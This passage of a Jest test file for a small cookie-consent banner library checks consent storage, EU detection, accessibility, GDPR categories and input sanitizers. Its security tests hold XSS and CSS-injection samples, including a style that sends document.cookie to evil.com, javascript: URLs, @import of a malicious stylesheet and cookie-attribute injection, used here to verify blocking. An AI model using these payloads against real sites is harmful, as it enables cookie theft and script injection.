/**
 * Tests for smallest-cookie-banner
 */

import {
  isEU,
  getConsent,
  setConsent,
  deleteConsent,
  createCookieBanner,
  initLegacy,
  DEFAULT_CSS,
  DEFAULT_CATEGORIES,
  LegacyCookieBannerAPI,
  sanitizeCss,
  sanitizeInlineStyle,
  sanitizeUrl,
  validateConfig,
  parseGranularConsent,
  encodeGranularConsent,
  CookieCategory,
  ConsentState,
  ConsentRecord,
} from '../src/cookie-banner';

// Store original location for restoration
const originalLocation = window.location;

describe('smallest-cookie-banner', () => {
  // Helper to reset state
  function resetState(): void {
    document.body.innerHTML = '';
    document.head.innerHTML = '';
    document.cookie.split(';').forEach((c) => {
      const name = c.trim().split('=')[0];
      if (name) {
        document.cookie = `${name}=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/`;
      }
    });
    window.CookieBanner = undefined;
    window.CookieBannerConfig = undefined;
  }

  beforeEach(() => {
    resetState();
    // Mock location with proper typing
    Object.defineProperty(window, 'location', {
      value: { protocol: 'http:', reload: jest.fn() },
      writable: true,
      configurable: true,
    });
    Object.defineProperty(document, 'readyState', {
      value: 'complete',
      writable: true,
      configurable: true,
    });
  });

  afterEach(() => {
    // Restore original location
    Object.defineProperty(window, 'location', {
      value: originalLocation,
      writable: true,
      configurable: true,
    });
  });

  afterEach(() => {
    jest.restoreAllMocks();
    jest.useRealTimers();
  });

  describe('isEU()', () => {
    it('returns true for EU timezones', () => {
      jest.spyOn(Date.prototype, 'getTimezoneOffset').mockReturnValue(0); // UTC
      expect(isEU()).toBe(true);

      jest.spyOn(Date.prototype, 'getTimezoneOffset').mockReturnValue(-60); // UTC+1
      expect(isEU()).toBe(true);

      jest.spyOn(Date.prototype, 'getTimezoneOffset').mockReturnValue(-120); // UTC+2
      expect(isEU()).toBe(true);
    });

    it('returns false for non-EU timezones', () => {
      jest.spyOn(Date.prototype, 'getTimezoneOffset').mockReturnValue(300); // UTC-5
      expect(isEU()).toBe(false);

      jest.spyOn(Date.prototype, 'getTimezoneOffset').mockReturnValue(-480); // UTC+8
      expect(isEU()).toBe(false);
    });
  });

  describe('getConsent()', () => {
    it('returns null when no consent cookie exists', () => {
      expect(getConsent()).toBeNull();
    });

    it('returns "1" when consent cookie is accepted', () => {
      document.cookie = 'ck=1;path=/';
      expect(getConsent()).toBe('1');
    });

    it('returns "0" when consent cookie is rejected', () => {
      document.cookie = 'ck=0;path=/';
      expect(getConsent()).toBe('0');
    });

    it('supports custom cookie name', () => {
      document.cookie = 'custom_consent=1;path=/';
      expect(getConsent('custom_consent')).toBe('1');
    });

    it('escapes regex special characters in cookie name', () => {
      // Cookie name with regex special chars should not break or match other cookies
      document.cookie = 'test.cookie=1;path=/';
      document.cookie = 'testXcookie=0;path=/';
      // Without escaping, "test.cookie" would match "testXcookie" since . matches any char
      expect(getConsent('test.cookie')).toBe('1');
    });
  });

  describe('setConsent()', () => {
    it('sets consent cookie', () => {
      setConsent('1');
      expect(document.cookie).toContain('ck=1');
    });

    it('supports custom cookie name', () => {
      setConsent('1', 'my_cookie');
      expect(document.cookie).toContain('my_cookie=1');
    });

    it('supports custom days', () => {
      setConsent('1', 'ck', 30);
      expect(document.cookie).toContain('ck=1');
    });
  });

  describe('deleteConsent()', () => {
    it('deletes consent cookie', () => {
      document.cookie = 'ck=1;path=/';
      deleteConsent();
      expect(getConsent()).toBeNull();
    });
  });

  describe('DEFAULT_CSS', () => {
    it('contains CSS custom properties', () => {
      expect(DEFAULT_CSS).toContain('--ckb-');
      expect(DEFAULT_CSS).toContain('#ckb');
    });
  });

  describe('createCookieBanner()', () => {
    it('creates instance with correct initial status', () => {
      const banner = createCookieBanner();
      expect(banner.status).toBeNull();
    });

    it('reads existing consent from cookie', () => {
      document.cookie = 'ck=1;path=/';
      const banner = createCookieBanner();
      expect(banner.status).toBe(true);
    });

    it('shows banner on show()', () => {
      const banner = createCookieBanner();
      banner.show();
      expect(document.getElementById('ckb')).not.toBeNull();
      expect(banner.isVisible()).toBe(true);
    });

    it('does not show banner if consent exists', () => {
      document.cookie = 'ck=1;path=/';
      const banner = createCookieBanner();
      banner.show();
      expect(document.getElementById('ckb')).toBeNull();
    });

    it('hides banner on hide()', () => {
      const banner = createCookieBanner();
      banner.show();
      banner.hide();
      expect(document.getElementById('ckb')).toBeNull();
      expect(banner.isVisible()).toBe(false);
    });

    it('sets consent on accept()', () => {
      const banner = createCookieBanner();
      banner.show();
      banner.accept();
      expect(banner.status).toBe(true);
      expect(getConsent()).toBe('1');
    });

    it('sets consent on reject()', () => {
      const banner = createCookieBanner();
      banner.show();
      banner.reject();
      expect(banner.status).toBe(false);
      expect(getConsent()).toBe('0');
    });

    it('calls onAccept callback', () => {
      const onAccept = jest.fn();
      const banner = createCookieBanner({ onAccept });
      banner.show();
      banner.accept();
      expect(onAccept).toHaveBeenCalled();
    });

    it('calls onReject callback', () => {
      const onReject = jest.fn();
      const banner = createCookieBanner({ onReject, forceEU: true });
      banner.show();
      banner.reject();
      expect(onReject).toHaveBeenCalled();
    });

    it('supports legacy onYes/onNo callbacks', () => {
      const onYes = jest.fn();
      const banner = createCookieBanner({ onYes });
      banner.show();
      banner.accept();
      expect(onYes).toHaveBeenCalled();
    });

    it('uses custom cookie name', () => {
      const banner = createCookieBanner({ cookieName: 'my_consent' });
      banner.accept();
      expect(getConsent('my_consent')).toBe('1');
    });

    it('uses custom days for cookie expiry', () => {
      const banner = createCookieBanner({ days: 30 });
      banner.accept();
      // Cookie is set - verify it exists (expiry is handled internally)
      expect(getConsent()).toBe('1');
      // Verify the cookie string contains an expiry date (not just session cookie)
      expect(document.cookie).toContain('ck=1');
    });

    it('destroys banner and cleans up', () => {
      const banner = createCookieBanner();
      banner.show();
      const styleId = document.querySelector('style[id^="ckb-style"]')?.id;
      banner.destroy();
      expect(document.getElementById('ckb')).toBeNull();
      if (styleId) {
        expect(document.getElementById(styleId)).toBeNull();
      }
    });

    it('destroys with clearCookie option', () => {
      const banner = createCookieBanner();
      banner.accept();
      expect(getConsent()).toBe('1');
      banner.destroy(true);
      expect(getConsent()).toBeNull();
    });

    describe('EU mode', () => {
      it('shows reject button when forceEU is true', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        expect(document.getElementById('ckn')).not.toBeNull();
      });

      it('hides reject button when forceEU is false', () => {
        const banner = createCookieBanner({ forceEU: false });
        banner.show();
        expect(document.getElementById('ckn')).toBeNull();
      });
    });

    describe('auto-accept (non-EU)', () => {
      beforeEach(() => {
        jest.useFakeTimers();
      });

      it('auto-accepts after timeout', () => {
        const banner = createCookieBanner({ forceEU: false, autoAcceptDelay: 1000 });
        banner.show();
        expect(banner.status).toBeNull();
        jest.advanceTimersByTime(1000);
        expect(banner.status).toBe(true);
      });

      it('auto-accepts on scroll', () => {
        const banner = createCookieBanner({ forceEU: false });
        banner.show();
        document.dispatchEvent(new Event('scroll'));
        expect(banner.status).toBe(true);
      });

      it('respects autoAcceptDelay of 0', () => {
        const banner = createCookieBanner({ forceEU: false, autoAcceptDelay: 0 });
        banner.show();
        jest.advanceTimersByTime(10000);
        expect(banner.status).toBeNull();
      });
    });

    describe('customization', () => {
      it('uses custom message', () => {
        const banner = createCookieBanner({ msg: 'Custom message' });
        banner.show();
        expect(document.getElementById('ckb')?.innerHTML).toContain('Custom message');
      });

      it('uses custom button text', () => {
        const banner = createCookieBanner({ acceptText: 'OK!', rejectText: 'No', forceEU: true });
        banner.show();
        expect(document.getElementById('cky')?.textContent).toBe('OK!');
        expect(document.getElementById('ckn')?.textContent).toBe('No');
      });

      it('applies custom style', () => {
        const banner = createCookieBanner({ style: 'background: red' });
        banner.show();
        expect(document.getElementById('ckb')?.style.background).toBe('red');
      });

      it('injects custom CSS', () => {
        const banner = createCookieBanner({ css: '.test{color:blue}' });
        banner.show();
        const style = document.querySelector('style[id^="ckb-style"]');
        expect(style?.textContent).toContain('.test{color:blue}');
      });

      it('uses custom container', () => {
        const container = document.createElement('div');
        container.id = 'custom-container';
        document.body.appendChild(container);
        const banner = createCookieBanner({ container });
        banner.show();
        expect(container.querySelector('#ckb')).not.toBeNull();
      });
    });

    describe('i18n / internationalization', () => {
      it('supports Dutch localization', () => {
        const banner = createCookieBanner({
          msg: 'Wij gebruiken cookies om uw ervaring te verbeteren.',
          acceptText: 'Accepteren',
          rejectText: 'Weigeren',
          forceEU: true
        });
        banner.show();
        expect(document.getElementById('ckb')?.innerHTML).toContain('Wij gebruiken cookies');
        expect(document.getElementById('cky')?.textContent).toBe('Accepteren');
        expect(document.getElementById('ckn')?.textContent).toBe('Weigeren');
      });

      it('supports Japanese localization', () => {
        const banner = createCookieBanner({
          msg: 'このサイトはクッキーを使用しています。',
          acceptText: '同意する',
          rejectText: '拒否する',
          forceEU: true
        });
        banner.show();
        expect(document.getElementById('ckb')?.innerHTML).toContain('このサイトはクッキーを使用しています');
        expect(document.getElementById('cky')?.textContent).toBe('同意する');
        expect(document.getElementById('ckn')?.textContent).toBe('拒否する');
      });

      it('supports German localization', () => {
        const banner = createCookieBanner({
          msg: 'Diese Website verwendet Cookies.',
          acceptText: 'Akzeptieren',
          rejectText: 'Ablehnen',
          forceEU: true
        });
        banner.show();
        expect(document.getElementById('ckb')?.innerHTML).toContain('Diese Website verwendet Cookies');
        expect(document.getElementById('cky')?.textContent).toBe('Akzeptieren');
        expect(document.getElementById('ckn')?.textContent).toBe('Ablehnen');
      });

      it('supports Spanish localization', () => {
        const banner = createCookieBanner({
          msg: 'Usamos cookies para mejorar tu experiencia.',
          acceptText: 'Aceptar',
          rejectText: 'Rechazar',
          forceEU: true
        });
        banner.show();
        expect(document.getElementById('ckb')?.innerHTML).toContain('Usamos cookies');
        expect(document.getElementById('cky')?.textContent).toBe('Aceptar');
        expect(document.getElementById('ckn')?.textContent).toBe('Rechazar');
      });

      it('supports Chinese localization', () => {
        const banner = createCookieBanner({
          msg: '我们使用cookies来提升您的体验。',
          acceptText: '接受',
          rejectText: '拒绝',
          forceEU: true
        });
        banner.show();
        expect(document.getElementById('ckb')?.innerHTML).toContain('我们使用cookies');
        expect(document.getElementById('cky')?.textContent).toBe('接受');
        expect(document.getElementById('ckn')?.textContent).toBe('拒绝');
      });
    });

    describe('XSS prevention', () => {
      it('escapes HTML in message', () => {
        const banner = createCookieBanner({ msg: '<script>alert(1)</script>' });
        banner.show();
        const content = document.getElementById('ckb')?.innerHTML || '';
        expect(content).not.toContain('<script>');
        expect(content).toContain('&lt;script&gt;');
      });
    });

    describe('multiple instances', () => {
      it('supports multiple banners with different cookies', () => {
        const banner1 = createCookieBanner({ cookieName: 'consent1' });
        const banner2 = createCookieBanner({ cookieName: 'consent2' });

        banner1.accept();
        expect(getConsent('consent1')).toBe('1');
        expect(getConsent('consent2')).toBeNull();
        expect(banner2.status).toBeNull();
      });
    });
  });

  describe('initLegacy()', () => {
    it('creates window.CookieBanner API', () => {
      window.CookieBannerConfig = {};
      initLegacy();
      expect(window.CookieBanner).toBeDefined();
      expect(typeof window.CookieBanner?.yes).toBe('function');
      expect(typeof window.CookieBanner?.no).toBe('function');
      expect(typeof window.CookieBanner?.reset).toBe('function');
    });

    it('shows banner automatically when no consent', () => {
      window.CookieBannerConfig = {};
      initLegacy();
      expect(document.getElementById('ckb')).not.toBeNull();
    });

    it('does not show banner when consent exists', () => {
      document.cookie = 'ck=1;path=/';
      window.CookieBannerConfig = {};
      initLegacy();
      expect(document.getElementById('ckb')).toBeNull();
    });

    it('legacy ok property reflects status', () => {
      window.CookieBannerConfig = {};
      initLegacy();
      const api = window.CookieBanner as LegacyCookieBannerAPI;
      expect(api.ok).toBeNull();
      api.yes();
      expect(api.ok).toBe(true);
    });

    it('legacy reset clears cookie and reloads', () => {
      window.CookieBannerConfig = {};
      initLegacy();
      const api = window.CookieBanner as LegacyCookieBannerAPI;
      api.yes();
      api.reset();
      expect(window.location.reload).toHaveBeenCalled();
    });
  });

  describe('click handlers', () => {
    it('accept button sets consent', () => {
      const banner = createCookieBanner({ forceEU: true });
      banner.show();
      document.getElementById('cky')?.click();
      expect(banner.status).toBe(true);
    });

    it('reject button sets consent', () => {
      const banner = createCookieBanner({ forceEU: true });
      banner.show();
      document.getElementById('ckn')?.click();
      expect(banner.status).toBe(false);
    });
  });

  // ============================================================================
  // CSS SANITIZATION TESTS (Security)
  // ============================================================================
  describe('CSS Sanitization', () => {
    describe('sanitizeCss()', () => {
      it('allows safe CSS properties', () => {
        const css = '#ckb { background: red; color: blue; padding: 10px; }';
        const result = sanitizeCss(css);
        expect(result).toContain('background');
        expect(result).toContain('color');
        expect(result).toContain('padding');
      });

      it('blocks url() with external URLs', () => {
        const css = 'body { background: url(https://evil.com/track); }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('evil.com');
        expect(result).not.toContain('https://');
      });

      it('allows url() with data URIs for images', () => {
        const css = 'body { background: url(data:image/png;base64,abc123); }';
        const result = sanitizeCss(css);
        expect(result).toContain('data:image');
      });

      it('blocks @import rules', () => {
        const css = '@import url(https://evil.com/malicious.css); body { color: red; }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('@import');
        expect(result).toContain('color');
      });

      it('blocks javascript: protocol', () => {
        const css = 'body { background: url(javascript:alert(1)); }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('javascript:');
      });

      it('blocks expression() (IE)', () => {
        const css = 'body { width: expression(alert(1)); }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('expression');
      });

      it('blocks behavior: (IE)', () => {
        const css = 'body { behavior: url(script.htc); }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('behavior');
      });

      it('blocks -moz-binding (Firefox XBL)', () => {
        const css = 'body { -moz-binding: url(xbl.xml); }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('-moz-binding');
      });

      it('blocks HTML tag injection via style tag breakout', () => {
        const css = '</style><script>alert(1)</script><style>';
        const result = sanitizeCss(css);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</style>');
      });

      it('handles case-insensitive attacks', () => {
        const css = '@IMPORT url(evil.com); EXPRESSION(alert(1))';
        const result = sanitizeCss(css);
        expect(result).not.toContain('IMPORT');
        expect(result).not.toContain('EXPRESSION');
      });

      it('handles obfuscated attacks with whitespace', () => {
        const css = '@im port url(evil.com); ex pression(alert(1))';
        const result = sanitizeCss(css);
        // After normalization, these should be blocked
        expect(result).not.toContain('import');
      });

      it('decodes CSS unicode escape sequences', () => {
        // \75\72\6C decodes to "url"
        const css = 'body { background: \\75\\72\\6C(https://evil.com); }';
        const result = sanitizeCss(css);
        // After decoding, url() should be blocked
        expect(result).not.toContain('evil.com');
      });

      it('blocks SVG data URIs (can contain scripts)', () => {
        const css = 'body { background: url(data:image/svg+xml,<svg onload="alert(1)"/>); }';
        const result = sanitizeCss(css);
        expect(result).not.toContain('svg');
      });

      it('allows safe raster image data URIs', () => {
        const css = 'body { background: url(data:image/png;base64,abc); }';
        const result = sanitizeCss(css);
        expect(result).toContain('data:image/png');
      });

      it('truncates very long CSS to prevent ReDoS', () => {
        const longCss = 'a'.repeat(60000);
        const result = sanitizeCss(longCss);
        expect(result.length).toBeLessThanOrEqual(50000);
      });
    });

    describe('sanitizeInlineStyle()', () => {
      it('allows safe inline styles', () => {
        const style = 'background: red; color: blue; padding: 10px;';
        const result = sanitizeInlineStyle(style);
        expect(result).toContain('background');
        expect(result).toContain('color');
        expect(result).toContain('padding');
      });

      it('blocks url() in inline styles', () => {
        const style = 'background: url(https://evil.com/exfil?cookie=' + document.cookie + ')';
        const result = sanitizeInlineStyle(style);
        expect(result).not.toContain('evil.com');
      });

      it('blocks expression() in inline styles', () => {
        const style = 'width: expression(alert(document.cookie))';
        const result = sanitizeInlineStyle(style);
        expect(result).not.toContain('expression');
      });
    });

    describe('sanitizeUrl()', () => {
      it('allows http URLs', () => {
        expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
      });

      it('allows https URLs', () => {
        expect(sanitizeUrl('https://example.com/privacy')).toBe('https://example.com/privacy');
      });

      it('allows relative URLs starting with /', () => {
        expect(sanitizeUrl('/privacy-policy')).toBe('/privacy-policy');
      });

      it('allows relative URLs starting with ./', () => {
        expect(sanitizeUrl('./privacy.html')).toBe('./privacy.html');
      });

      it('allows relative URLs starting with ../', () => {
        expect(sanitizeUrl('../privacy.html')).toBe('../privacy.html');
      });

      it('allows anchor links', () => {
        expect(sanitizeUrl('#privacy-section')).toBe('#privacy-section');
      });

      it('blocks javascript: URLs (XSS attack)', () => {
        expect(sanitizeUrl('javascript:alert(1)')).toBe('');
        expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBe('');
        expect(sanitizeUrl('  javascript:alert(document.cookie)')).toBe('');
      });

      it('blocks data: URLs', () => {
        expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
      });

      it('blocks vbscript: URLs', () => {
        expect(sanitizeUrl('vbscript:msgbox(1)')).toBe('');
      });

      it('blocks file: URLs', () => {
        expect(sanitizeUrl('file:///etc/passwd')).toBe('');
      });

      it('returns empty string for empty input', () => {
        expect(sanitizeUrl('')).toBe('');
        expect(sanitizeUrl(null as unknown as string)).toBe('');
        expect(sanitizeUrl(undefined as unknown as string)).toBe('');
      });

      it('trims whitespace', () => {
        expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com');
      });
    });

    describe('CSS injection in banner', () => {
      it('sanitizes config.css before injection', () => {
        const banner = createCookieBanner({
          css: '@import url(https://evil.com); body { background: url(https://track.com); }',
        });
        banner.show();
        const style = document.querySelector('style[id^="ckb-style"]');
        expect(style?.textContent).not.toContain('@import');
        expect(style?.textContent).not.toContain('evil.com');
        expect(style?.textContent).not.toContain('track.com');
      });

      it('sanitizes config.style before applying', () => {
        const banner = createCookieBanner({
          style: 'background: url(https://evil.com/steal)',
        });
        banner.show();
        const el = document.getElementById('ckb');
        expect(el?.style.cssText).not.toContain('evil.com');
      });
    });
  });

  // ============================================================================
  // INPUT VALIDATION TESTS
  // ============================================================================
  describe('Input Validation', () => {
    describe('validateConfig()', () => {
      it('validates cookie name format', () => {
        expect(() => validateConfig({ cookieName: 'valid_cookie-name' })).not.toThrow();
        expect(() => validateConfig({ cookieName: '' })).toThrow();
        expect(() => validateConfig({ cookieName: 'invalid;cookie' })).toThrow();
        expect(() => validateConfig({ cookieName: 'invalid cookie' })).toThrow();
      });

      it('validates days range', () => {
        const config1 = validateConfig({ days: 30 });
        expect(config1.days).toBe(30);

        const config2 = validateConfig({ days: -1 });
        expect(config2.days).toBe(365); // Falls back to default

        const config3 = validateConfig({ days: 9999999 });
        expect(config3.days).toBe(3650); // Capped at 10 years

        const config4 = validateConfig({ days: 0 });
        expect(config4.days).toBe(365); // Falls back to default
      });

      it('validates autoAcceptDelay range', () => {
        const config1 = validateConfig({ autoAcceptDelay: 3000 });
        expect(config1.autoAcceptDelay).toBe(3000);

        const config2 = validateConfig({ autoAcceptDelay: -1000 });
        expect(config2.autoAcceptDelay).toBe(5000); // Falls back to default

        const config3 = validateConfig({ autoAcceptDelay: 999999999 });
        expect(config3.autoAcceptDelay).toBe(300000); // Capped at 5 minutes
      });

      it('validates container is HTMLElement', () => {
        const validContainer = document.createElement('div');
        const config = validateConfig({ container: validContainer });
        expect(config.container).toBe(validContainer);
      });

      it('rejects invalid container', () => {
        const config = validateConfig({ container: 'not-an-element' as unknown as HTMLElement });
        expect(config.container).toBeUndefined();
      });
    });

    describe('cookie name injection prevention', () => {
      it('prevents cookie attribute injection via cookie name', () => {
        // Attempting to inject HttpOnly or Domain via cookie name
        // Validation happens at config time, not at accept time
        expect(() => createCookieBanner({ cookieName: 'ck; HttpOnly; Domain=evil.com' })).toThrow();
      });
    });
  });

  // ============================================================================
  // ACCESSIBILITY TESTS
  // ============================================================================
  describe('Accessibility', () => {
    describe('ARIA attributes', () => {
      it('has role="dialog" on banner', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        const el = document.getElementById('ckb');
        expect(el?.getAttribute('role')).toBe('dialog');
      });

      it('has aria-label on banner', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        const el = document.getElementById('ckb');
        expect(el?.getAttribute('aria-label')).toBe('Cookie consent');
      });

      it('has aria-describedby linking to message', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        const el = document.getElementById('ckb');
        const msgId = el?.querySelector('p')?.id;
        expect(el?.getAttribute('aria-describedby')).toBe(msgId);
      });

      it('has aria-modal="true" for modal behavior', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        const el = document.getElementById('ckb');
        expect(el?.getAttribute('aria-modal')).toBe('true');
      });

      it('buttons have type="button"', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        const acceptBtn = document.getElementById('cky');
        const rejectBtn = document.getElementById('ckn');
        expect(acceptBtn?.getAttribute('type')).toBe('button');
        expect(rejectBtn?.getAttribute('type')).toBe('button');
      });
    });

    describe('keyboard navigation', () => {
      it('ESC key rejects consent in EU mode', () => {
        const onReject = jest.fn();
        const banner = createCookieBanner({ forceEU: true, onReject });
        banner.show();

        const event = new KeyboardEvent('keydown', { key: 'Escape' });
        document.dispatchEvent(event);

        expect(onReject).toHaveBeenCalled();
        expect(banner.status).toBe(false);
      });

      it('ESC key accepts consent in non-EU mode', () => {
        const onAccept = jest.fn();
        const banner = createCookieBanner({ forceEU: false, onAccept, autoAcceptDelay: 0 });
        banner.show();

        const event = new KeyboardEvent('keydown', { key: 'Escape' });
        document.dispatchEvent(event);

        expect(onAccept).toHaveBeenCalled();
        expect(banner.status).toBe(true);
      });

      it('focus is trapped within banner', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();

        const el = document.getElementById('ckb');
        const buttons = el?.querySelectorAll('button');

        // Focus on last button and tab should go to first
        buttons?.[buttons.length - 1]?.focus();

        const tabEvent = new KeyboardEvent('keydown', { key: 'Tab' });
        document.dispatchEvent(tabEvent);

        // Focus should wrap to first focusable element
        // (Implementation will handle this)
      });

      it('moves focus to banner on show', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();

        const el = document.getElementById('ckb');
        expect(document.activeElement).toBe(el);
      });

      it('restores focus on hide', () => {
        const previousFocus = document.createElement('button');
        document.body.appendChild(previousFocus);
        previousFocus.focus();

        const banner = createCookieBanner({ forceEU: true });
        banner.show();
        banner.accept();

        expect(document.activeElement).toBe(previousFocus);
        previousFocus.remove();
      });
    });

    describe('touch targets', () => {
      it('buttons have minimum 44x44px touch target', () => {
        const banner = createCookieBanner({ forceEU: true });
        banner.show();

        const style = document.querySelector('style[id^="ckb-style"]');
        // Check that CSS includes min-height and min-width for buttons
        expect(style?.textContent).toContain('min-height:44px');
        expect(style?.textContent).toContain('min-width:44px');
      });
    });

    describe('reduced motion', () => {
      it('includes prefers-reduced-motion media query', () => {
        const banner = createCookieBanner();
        banner.show();
        const style = document.querySelector('style[id^="ckb-style"]');
        expect(style?.textContent).toContain('prefers-reduced-motion');
      });
    });
  });

  // ============================================================================
  // CSP NONCE SUPPORT TESTS
  // ============================================================================
  describe('CSP Nonce Support', () => {
    it('adds nonce attribute to style tag when provided', () => {
      const banner = createCookieBanner({ cspNonce: 'abc123' });
      banner.show();
      const style = document.querySelector('style[id^="ckb-style"]');
      expect(style?.getAttribute('nonce')).toBe('abc123');
    });

    it('does not add nonce attribute when not provided', () => {
      const banner = createCookieBanner();
      banner.show();
      const style = document.querySelector('style[id^="ckb-style"]');
      expect(style?.hasAttribute('nonce')).toBe(false);
    });
  });

  // ============================================================================
  // COOKIE DOMAIN CONFIGURATION TESTS
  // ============================================================================
  describe('Cookie Domain Configuration', () => {
    it('accepts cookieDomain configuration without error', () => {
      // jsdom doesn't properly support cookie domains for non-localhost domains
      // Just verify that the API works without throwing
      const banner = createCookieBanner({ cookieDomain: '.example.com' });
      expect(() => banner.accept()).not.toThrow();
      // Status should be updated even if cookie domain doesn't work in jsdom
      expect(banner.status).toBe(true);
    });

    it('validates cookie domain format', () => {
      // Domain should start with a dot for subdomain matching or be exact
      const config1 = validateConfig({ cookieDomain: '.example.com' });
      expect(config1.cookieDomain).toBe('.example.com');

      const config2 = validateConfig({ cookieDomain: 'example.com' });
      expect(config2.cookieDomain).toBe('example.com');

      // Invalid domains should be rejected
      const config3 = validateConfig({ cookieDomain: 'not a domain!' });
      expect(config3.cookieDomain).toBeUndefined();
    });
  });

  // ============================================================================
  // REFLOW PREVENTION TESTS
  // ============================================================================
  describe('Reflow Prevention', () => {
    it('sets innerHTML before appending to DOM', () => {
      const appendChildSpy = jest.spyOn(document.body, 'appendChild');

      const banner = createCookieBanner();
      banner.show();

      // Verify appendChild was called with an element that already has innerHTML
      expect(appendChildSpy).toHaveBeenCalled();
      const appendedEl = appendChildSpy.mock.calls[0]?.[0] as HTMLElement;
      expect(appendedEl.innerHTML).toContain('button');

      appendChildSpy.mockRestore();
    });
  });

  // ============================================================================
  // CALLBACK ERROR HANDLING TESTS
  // ============================================================================
  describe('Callback Error Handling', () => {
    it('catches and handles errors in onAccept callback', () => {
      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
      const banner = createCookieBanner({
        onAccept: () => {
          throw new Error('Callback error');
        },
      });
      banner.show();

      // Should not throw
      expect(() => banner.accept()).not.toThrow();
      expect(consoleSpy).toHaveBeenCalled();

      consoleSpy.mockRestore();
    });

    it('catches and handles errors in onReject callback', () => {
      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
      const banner = createCookieBanner({
        forceEU: true,
        onReject: () => {
          throw new Error('Callback error');
        },
      });
      banner.show();

      // Should not throw
      expect(() => banner.reject()).not.toThrow();
      expect(consoleSpy).toHaveBeenCalled();

      consoleSpy.mockRestore();
    });
  });

  // ============================================================================
  // GDPR MODE TESTS (Granular Consent)
  // ============================================================================
  describe('GDPR Mode (Granular Consent)', () => {
    describe('DEFAULT_CATEGORIES', () => {
      it('contains essential category marked as required', () => {
        const essential = DEFAULT_CATEGORIES.find(c => c.id === 'essential');
        expect(essential).toBeDefined();
        expect(essential?.required).toBe(true);
      });

      it('contains analytics, marketing, and functional categories', () => {
        const ids = DEFAULT_CATEGORIES.map(c => c.id);
        expect(ids).toContain('essential');
        expect(ids).toContain('analytics');
        expect(ids).toContain('marketing');
        expect(ids).toContain('functional');
      });

      it('all categories have name and description', () => {
        for (const cat of DEFAULT_CATEGORIES) {
          expect(cat.name).toBeDefined();
          expect(cat.description).toBeDefined();
        }
      });
    });

    describe('parseGranularConsent()', () => {
      it('returns null for null input', () => {
        expect(parseGranularConsent(null)).toBeNull();
      });

      it('parses legacy "1" as all accepted', () => {
        const result = parseGranularConsent('1');
        expect(result).toEqual({ all: true });
      });

      it('parses legacy "0" as all rejected', () => {
        const result = parseGranularConsent('0');
        expect(result).toEqual({ all: false });
      });

      it('parses legacy "1" with categories as all enabled (except required)', () => {
        const categories: CookieCategory[] = [
          { id: 'essential', name: 'Essential', required: true },
          { id: 'analytics', name: 'Analytics' },
        ];
        const result = parseGranularConsent('1', categories);
        expect(result).toEqual({ essential: true, analytics: true });
      });

      it('parses legacy "0" with categories - required stays true', () => {
        const categories: CookieCategory[] = [
          { id: 'essential', name: 'Essential', required: true },
          { id: 'analytics', name: 'Analytics' },
        ];
        const result = parseGranularConsent('0', categories);
        expect(result).toEqual({ essential: true, analytics: false });
      });

      it('parses granular format correctly', () => {
        const result = parseGranularConsent('essential:1,analytics:0,marketing:1');
        expect(result).toEqual({ essential: true, analytics: false, marketing: true });
      });
    });

    describe('encodeGranularConsent()', () => {
      it('encodes consent state to string', () => {
        const state: ConsentState = { essential: true, analytics: false, marketing: true };
        const result = encodeGranularConsent(state);
        expect(result).toContain('essential:1');
        expect(result).toContain('analytics:0');
        expect(result).toContain('marketing:1');
      });
    });

    describe('GDPR banner rendering', () => {
      it('shows categories panel in GDPR mode', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        expect(document.getElementById('ckb-cats')).not.toBeNull();
      });

      it('shows categories when categories array is provided', () => {
        const banner = createCookieBanner({
          categories: DEFAULT_CATEGORIES,
          forceEU: true,
        });
        banner.show();
        expect(document.getElementById('ckb-cats')).not.toBeNull();
      });

      it('shows settings button in GDPR mode', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        expect(document.getElementById('cks')).not.toBeNull();
      });

      it('shows save button (hidden initially) in GDPR mode', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        const saveBtn = document.getElementById('cksv');
        expect(saveBtn).not.toBeNull();
        expect(saveBtn?.style.display).toBe('none');
      });

      it('uses Accept All and Reject All text in GDPR mode', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        expect(document.getElementById('cky')?.textContent).toBe('Accept All');
        expect(document.getElementById('ckn')?.textContent).toBe('Reject All');
      });

      it('renders checkboxes for each category', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        const checkboxes = document.querySelectorAll('input[name="ckb-cat"]');
        expect(checkboxes.length).toBe(DEFAULT_CATEGORIES.length);
      });

      it('disables required category checkboxes', () => {
        const banner = createCookieBanner({ mode: 'gdpr', forceEU: true });
        banner.show();
        const essentialCheckbox = document.querySelector('input[value="essential"]') as HTMLInputElement;
        expect(essentialCheckbox?.disabled).toBe(true);
        expect(essentialCheckbox?.checked).toBe(true);
      });

      it('shows privacy policy link when URL provided', () => {
        const banner = createCookieBanner({
          mode: 'gdpr',
          forceEU: true,
          privacyPolicyUrl: 'https://example.com/privacy',
        });
        banner.show();
        const link = document.querySelector('#ckb a[href="https://example.com/privacy"]');
        expect(link).not.toBeNull();
      });
    });

    describe('GDPR settings toggle', () => {
      it('toggles expanded class on settings click', () => {
